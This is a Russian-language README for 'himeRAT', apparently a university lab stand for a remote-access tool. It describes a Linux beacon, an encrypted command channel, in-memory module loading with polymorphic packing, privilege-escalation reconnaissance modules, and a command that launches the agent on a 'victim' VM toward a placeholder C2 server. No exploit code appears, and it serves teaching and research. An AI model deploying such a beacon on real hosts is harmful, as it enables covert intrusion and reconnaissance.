# himeRAT — учебный стенд кибербезопасности

> **ДИСКЛЕЙМЕР.** Проект предназначен **исключительно** для авторизованной лаборатории (дипломная работа при поддержке Kaspersky). Запускайте только на изолированных виртуальных машинах, принадлежащих вам, с подписанным разрешением. Любое использование вне лаборатории запрещено.

## Назначение

Стенд демонстрирует:

- многостадийную доставку модулей на Linux-узел;
- зашифрованный канал **ECDH (X25519) + AES-GCM** между агентом и сервером синхронизации;
- модули **инвентаризации** (SUID, sudo, cron, ядро/CVE, capabilities);
- веб-панель оператора (HTTPS, JWT) для постановки заданий и просмотра отчётов.

Это **не** боевое ВПО: модули выполняют только сбор данных (read-only), без автоэксплуатации и обхода антивируса.

## Архитектура

```
┌─────────────────┐     ECDH + AES-GCM      ┌──────────────────┐
│  Агент (Linux)  │ ◄──────────────────────►│  control :1337   │
│  stage1/run.py  │                         │  (Python)        │
└─────────────────┘                         └────────┬─────────┘
                                                   │ SQLite
┌─────────────────┐     HTTPS :8443              │
│  Оператор (браузер) ◄──────────────────────────┤
│  web-панель (Go)│                               │
└─────────────────┘                         /data/computers.db
```

1. **Стадия 1** — агент устанавливает сессию (`/v1/session`), затем обменивается зашифрованными сообщениями (`/v1/channel`).
2. **Стадия 2** — загрузка ZIP с модулями (AES + полиморфный шум при сборке), загрузка в память через `importlib`.
3. **Панель** — постановка заданий в очередь, просмотр JSON-отчётов.

## Быстрый старт (Docker)

```bash
# из корня репозитория
docker compose up --build

# панель: https://localhost:8443  (самоподписанный сертификат — примите в браузере)
# зарегистрируйте оператора через /register
```

Сервис синхронизации: `http://localhost:1337` (для агентов).

## Ручной запуск

### Сервер

```bash
cd server/src_control
pip install -r requirements.txt
python server.py
```

### Панель

```bash
cd server/src_web
go run server.go
# https://localhost:8443
```

### Агент на узле-жертве (лабораторная ВМ)

```bash
cd beacon
pip install -r requirements.txt
python stage1/run.py --server http://IP_СЕРВЕРА:1337 --user admin --password password
```

### Постановка задания

Через панель: **Узлы → Открыть → кнопка модуля**

Или CLI:

```bash
python server/src_control/enqueue_task.py --agent 1 --task enum_sudo
```

## Модули инвентаризации

| Задание | Описание |
|---------|----------|
| `recon` | hostname, user, kernel, platform |
| `enum_suid` | SUID-бинарники |
| `enum_sudo` | `sudo -l`, кандидаты GTFOBins (отчёт) |
| `enum_cron` | cron-файлы |
| `enum_kernel` | сопоставление ядра с CVE (отчёт) |
| `enum_capabilities` | `getcap` |
| `enum_writable` | записываемые чувствительные пути |

## Криптография

| Слой | Механизм |
|------|----------|
| Сессия агента | X25519 ECDH → HKDF-SHA256 → AES-256-GCM |
| Модули в ZIP | AES-CFB (ключ от агента при `pull_package`) |
| Панель | TLS (самоподписанный) + JWT cookie |

## Переменные окружения

| Переменная | Сервис | Описание |
|------------|--------|----------|
| `LAB_USER` / `LAB_PASS` | control | Basic-auth агента |
| `JWT_SECRET` | web | секрет JWT |
| `DB_PATH` | оба | путь к SQLite |
| `BEACON_MODULES` | control | каталог модулей |

## Структура репозитория
